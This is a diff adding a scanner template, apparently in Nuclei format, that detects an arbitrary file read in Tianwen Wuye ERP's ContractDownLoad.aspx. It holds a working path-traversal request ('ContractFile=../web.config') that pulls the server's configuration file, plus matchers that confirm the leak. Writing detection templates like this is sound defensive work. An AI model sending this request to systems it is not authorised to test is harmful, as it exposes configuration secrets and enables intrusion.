@@ -1,0 +1,27 @@
+id: tianwen-wuye-erp-contractdownload-aspx-file-read
+info:
+  name: Tianwen Wuye ERP ContractDownLoad.aspx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename=web.config"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
